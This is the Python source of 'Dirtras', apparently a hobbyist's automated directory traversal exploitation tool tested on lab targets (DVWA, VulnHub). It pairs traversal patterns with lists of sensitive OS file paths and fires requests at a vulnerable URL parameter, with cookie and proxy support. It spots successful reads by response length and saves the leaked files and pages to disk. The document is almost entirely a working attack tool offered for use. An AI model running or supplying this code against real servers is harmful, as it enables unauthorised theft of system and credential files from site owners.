# Dirtras - By Nate-one - https://github.com/Nate-one
# python -m pip install requests

from urllib.parse import urlparse
import requests
import sys
import os
import getopt
import time

# Define flag options
short_opts = "hu:o:p:d:f:x:bc:"

long_opts = ["help", "url=", "os=", "port=", "delay=",
             "file=", "proxy=", "host-system=", "bugs", "output=", "cookie=", "cookie-name="
             ]

args = sys.argv

argument_list = args[1:]

help_info = """

Usage Example:

>dirtras.py -u http://192.168.28.129/download.php?item= -p 80 --os linux --host-system windows -o C:\\Users\\nate\\tools\\output -f deep_directory_list.txt

-h  --help      Display this menu

-u  --url       Set the URL to traverse
-o  --output    Specify output folder directory
-p  --port      Set the port (default is 80)
-f  --file      Use a file of custom traversal directories

    --host-system   Define the OS that dirtras is running on (Default linux)
    
    
Note: Unless the website is behind a login you typically don't need to use cookies

-c  --cookie        Use a session cookie, mainly used if page is behind a login
-n  --cookie-name   Use this to define the name of the cookie (PHPSESSID etc)

(To use multiple cookies seperate each name/cookie with a comma (,) and place in respective order.)
e.g --cookie-name PHPSESSID,security -c uif2fs4mpdqv6undddgmpgf9m0,low

-x  --proxy     Use a proxy to route requests through
-d  --delay     Set a delay between requests (Default is 0.01)
    --os        Define what OS the web server is on (linux/windows) (Default linux)
    
-b  --bugs      Display currently known bugs and problems

If you're getting a [WinError 10048] error or similar ephemeral port exhaustion, try increasing the delay.


Upcoming Features:

Level of scans (-l1 -l2 -l3)
    To determine how intensive a scan which will increase/decrease number of packets

Performance Improvements and Bug Fixes
    General fixes to issues stated in bug info (-b --bugs)
"""

bug_info = """

KNOWN DIRTRAS BUGS:

--- 1 ---
/proc/self/cwd/index.php 
Was removed from linux_files.txt because it crashed DVWA during test.
Feel free to add it back but if you get HTTPConnectionPool Read timed out. error than that might be it.

--- 2 ---

[WinError 10048]
Ephemeral Port Exhausation is a problem when sending thousands of requests in a short span on time.
To mitigate this I increased the delay to 0.02 and that seemed to work. However, you may want it higher.

--- 3 ---
fail_traversal
Whilst the variable fail_traversal is sent to \"../thisdoesntwork\" it hasn't been fully tested so
it may not always provide accruate results for what a failed traversal looks like.

--- 4 ---
file_counter | files_to_get
This counter is used purely to give the user an idea of how many files have been retrieved so far.
It isn't meant to be accurate as the system around detecting files is pretty poor at the moment.
This might mean that the counter goes higher than the expected number of files to get and that's
probably due to tcp/udp files increasing and decreasing in size.


"""

file = ""
output = ""

cookie = ""
cookie_name = ""
session_cookie = ""

OS = "linux"
host_sys = "linux"

url = ""
fail_traversal = "../thisdoesntwork"
traversal_data_list = []

# Keeps log of file that have been found
file_found_list = []
html_found_list = []


iter_count = 0
port = 80
delay = 0.02

https = False
file_check = False
output_check = False
url_check = False

print("""

 /$$$$$$$  /$$        /$$$$$$$$                          
| $$__  $$|__/       |__  $$__/                          
| $$  \ $$ /$$  /$$$$$$ | $$  /$$$$$$  /$$$$$$   /$$$$$$$
| $$  | $$| $$ /$$__  $$| $$ /$$__  $$|____  $$ /$$_____/
| $$  | $$| $$| $$  \__/| $$| $$  \__/ /$$$$$$$|  $$$$$$ 
| $$  | $$| $$| $$      | $$| $$      /$$__  $$ \____  $$
| $$$$$$$/| $$| $$      | $$| $$     |  $$$$$$$ /$$$$$$$/
|_______/ |__/|__/      |__/|__/      \_______/|_______/ 

                                            
Automated Directory Traversal Exploitation Tool

This tool allows for the automation of directory traversal for windows and linux based file system.

(This is currently a work in progress so expect bugs)

Created by @Nate-One
https://github.com/Nate-one

Tested On:
VulnHub - Seattle 0.0.3
DVWA (Low, Medium, High)

Use -h for help



""")


def is_downloadable(u):
    """
    Does the url contain a downloadable resource
    """
    try:
        head = requests.head(u, allow_redirects=True)
    except requests.exceptions.ConnectionError as err:
        sys.exit(f"Connection Error | {err} | To prevent this try to increase the delay between requests")

    header = head.headers
    content_type = header.get('content-type')

    if "text" in content_type.lower():
        return False

    if "html" in content_type.lower():
        return False

    return True


try:
    arguments, values = getopt.getopt(argument_list, short_opts, long_opts)

except getopt.error as error:
    sys.exit(f"{error}\n")

# Get arg/val from terminal
# Assign variables to each one and do basic checks

for arg, val in arguments:

    if arg in ("-h", "--help"):
        print(help_info)

        if len(arguments) <= 1:  # Exits if help is the only flag
            sys.exit()

    if arg in ("-b", "--bugs"):
        print(bug_info)

        if len(arguments) <= 1:
            sys.exit()

    if arg in ("-u", "--url"):
        url, url_check = val, True

        if url[-1:] == "=":  # Last character should be =
            continue
        try:
            url = url[:(url.index("=") + 1)]  # Tries to strip url to get = to last character position

        except ValueError:
            sys.exit(f"Invalid URL - {url} \n\nIt seems that URL isn't affected by directory traversal.")

    if arg == "--os":
        OS = val.lower()
        if OS in ("linux", "windows"):
            continue
        else:
            sys.exit(f"Invalid OS - {OS} \n\nUse either \'Linux\' or \'Windows\'")  # Exit if invalid OS defined

    if arg in ("-x", "--proxy"):

        proxy = val
        continue

    if arg in ("-p", "--port"):
        try:
            port = int(val)
            continue
        except ValueError as error:
            sys.exit("Error whilst setting port - {error} \n\nUser an integer arguement")

    if arg in ("-d", "--delay"):
        try:
            delay = int(val)
        except ValueError as error:
            sys.exit(f"Error whilst setting delay - {error} \n\nUse an integer arguement")
        continue

    if arg in ("-f", "--file"):
        file, file_check = val, True
        continue

    if arg in ("-o", "--output"):
        output, output_check = val, True

    if arg in ("-c", "--cookies"):
        cookie = val
        if "," in cookie:
            cookie = cookie.split(",")

    if arg == "--cookie-name":
        cookie_name = val
        if "," in cookie_name:
            cookie_name = cookie_name.split(",")

    if arg == "--host-system":
        if val.lower() in ("linux", "windows"):
            host_sys = val.lower()
        else:
            sys.exit("Error whilst setting host system | Use \'linux\' or \'windows\'")


# Check that certain flags have been called

if not file_check:
    sys.exit("Directory Traversal Failed - No File Specified | Use -f or --file")

if not url_check:
    sys.exit("Directory Traversal Failed - No URL Specified | Use -u or --url")

# Creates an output folder if one isn't given
if not output_check:

    # Changes default output directory depending on OS
    if host_sys == "windows":
        output, output_check = fr"{os.getcwd()}\\output", True

    else:
        output, output_check = f"{os.getcwd()}/output", True

    print(f"No Output File Specified | Creating a new folder at {output} | Ctrl + C to suspend | Use -o or --output")

    time.sleep(5)

# Advises that https is not usually on port 80

if "https" in url and port == 80:
    print("It seems you're going against convention and asking for https while using port 80? Continuing...")
    time.sleep(3)

# Recommends increased delay

if delay < 0.02:
    print("It is suggested that you use a delay value higher than 0.02 to prevent ephemeral port exhaustion")
    time.sleep(1)

# Checks cookie name exists if a cookie is given

if not cookie_name and cookie:
    sys.exit("You must define the name of the cookie when using session cookies e.g PHPSESSID")

# Checks cookie input and sets session cookie dictionary

if cookie_name and cookie:
    session_cookie = {}
    # Advises that number of cookies and cookie names
    if len(cookie) != len(cookie_name):
        sys.exit("You must provide the same number of cookie names to cookies.")

    # If there's only one cookie name / cookie set the variable manually
    if (len(cookie) and len(cookie_name)) == 1:
        session_cookie = {cookie_name: cookie}

    else:
        # Uses split cookie names and cookies to create cookie dictionary
        for i in range(len(cookie_name)):
            session_cookie[cookie_name[i]] = cookie[i]


# Attempt to create output directories

try:
    if host_sys == "windows":
        os.mkdir(fr"{output}\\html")
        os.mkdir(fr"{output}\\downloaded")
    else:
        os.mkdir(f"{output}\html")
        os.mkdir(f"{output}\downloaded")

except FileExistsError as error:
    print(f"Folder {output} already exists.  Continuing...")
    time.sleep(1)

# Main loops to

with open(file, "r") as traverse_file, open(f"{OS}_files.txt", "r") as interest_dirs:

    session = requests.session()

    # Read files to remove the need to change the pointer
    traverse_file_list = traverse_file.readlines()
    interest_dirs_list = interest_dirs.readlines()

    # Gets the number of files that are supposed to be retrieved
    files_to_get = len(interest_dirs_list)

    # Counts number of files found
    file_counter = 0

    # Calculates number of iterations for user
    num_of_iterations = len(traverse_file_list) * len(interest_dirs_list)

    # By using a traversal directory that is going to fail
    # we can find the byte length of what a failed traversal would be
    # which reduces the need for manual review of thousands of files

    fail_url = url + fail_traversal  # Creates the url to fail

    try:
        # No cookies
        if not cookie:
            failed_traversal = session.get(fail_url)

        # With cookies
        else:
            failed_traversal = session.get(fail_url, cookies=session_cookie)  # Sends request with cookie

    except Exception as error:
        sys.exit(f"Failed To Get Failed Traversal Content For Comparison | {error}")

    # Get byte length of what a failed traversal would be
    failed_traversal_content_len = len(failed_traversal.content)

    # Iterate through different traversal techniques
    for traverse in traverse_file_list:

        # Iterate through os relevant directories
        for os_dir in interest_dirs_list:

            # Delay and count here isntead of at the end of every if statement
            time.sleep(delay)
            iter_count += 1
            # Removes / start from the directory so it isn't duplicated
            if os_dir[:1] in ("/", "\\"):
                os_dir = os_dir[1:]
            # Creates the traversal directory/interest file and removes trailing \n
            directory_os_dir = fr"{traverse}"[:-1].replace("{FILE}",
                                                           fr"{os_dir}"[:-1]).replace("{FILE", fr"{os_dir}"[:-1])

            parsed_url = urlparse(url)  # Create urllib parse object
            proto_hostname = f"{parsed_url.scheme}://{parsed_url.netloc}/"  # Scheme + Hostname

            # Creates url with traversel/directory

            url_directory_built = f"{url[len(proto_hostname):]}{directory_os_dir}"

            # Creates final url
            built_url = f"{url[:len(proto_hostname) - 1]}:{port}/{url_directory_built}"

            # Attempt to send request and handle exception
            try:
                if not cookie:
                    dir_traversal_target = session.get(built_url, timeout=3)

                else:
                    dir_traversal_target = session.get(built_url, cookies=session_cookie, timeout=3)  # Sends request with cookie

            except Exception as error:
                session = requests.session()
                print(f"Current Iteration: {iter_count}/{num_of_iterations} | {file_counter}/{files_to_get}"
                      f" | HTTP Error - {error} | ", end="")
                print(f"Current URL: {built_url[0:80]}... ", end="")
                print("", end="\r", flush=True)
                continue

            # Display current stats - URL, Status, Length and Iteration

            print(f"Current Iteration: {iter_count}/{num_of_iterations} | {file_counter}/{files_to_get} | "
                  f"Length - {len(dir_traversal_target.content)} | ", end="")
            print(f"Current URL: {built_url[0:80]}... ", end="")
            print("", end="\r", flush=True)

            # The following takes the current URL and checks

            if is_downloadable(built_url):

                # Get content disposition from header and build file name from it
                # By using content-disposition it removes the need to create filenames based on target OS

                file_download_name = \
                    dir_traversal_target.headers.get('content-disposition') \
                    .replace("\"", " ").replace("filename=", "").replace(" ", "")

                # If the content is empty continue
                if len(dir_traversal_target.content) == 0:
                    continue

                # Skip files that have already been found
                if (file_download_name, len(dir_traversal_target.content)) in file_found_list:
                    continue

                file_found_list.append((file_download_name, len(dir_traversal_target.content)))

                # Save downloadable content to downloaded folder

                if host_sys == "windows":

                    # Windows directory formatting
                    open(fr"{output}\\downloaded\\{file_download_name}_{iter_count}.txt",
                         "wb").write(dir_traversal_target.content)

                    file_counter += 1
                    continue

                else:

                    # Linux directory formatting
                    open(f"{output}/downloaded/{file_download_name}_{iter_count}.txt",
                         "wb").write(dir_traversal_target.content)

                    file_counter += 1
                    continue

            # If the traversal failed, continue
            if len(dir_traversal_target.content) == failed_traversal_content_len:
                continue

            # Save content to html folder with specific name / formatting
            else:

                # If the content is empty continue
                if len(dir_traversal_target.content) == 0:
                    continue

                # If the content has already been found, skip
                if os_dir in html_found_list:
                    continue

                html_found_list.append(os_dir)

                #  Creates filename depending on target OS
                if OS == "windows":
                    os_dir_file = os_dir.split(r"\\")[-1].rstrip("\n").replace(".", "_").replace("\\", "_")
                else:
                    os_dir_file = os_dir.rstrip("\n").replace(".", "_").replace("/", "_")

                # Create directory filenames for specific host operating system
                windows_directory_filename = fr"{output}\\html\\{os_dir_file}_content_{iter_count}.html"
                linux_directory_filename = f"{output}/html/{os_dir_file}_content_{iter_count}.html"

                try:
                    if host_sys == "windows":
                        open(windows_directory_filename, "wb").write(dir_traversal_target.content)
                        file_counter += 1

                    else:
                        open(linux_directory_filename, "wb").write(dir_traversal_target.content)
                        file_counter += 1

                except OSError as error:
                    sys.exit(f"OS Error Occurred | {error} | Maybe you need to set --host-system?")
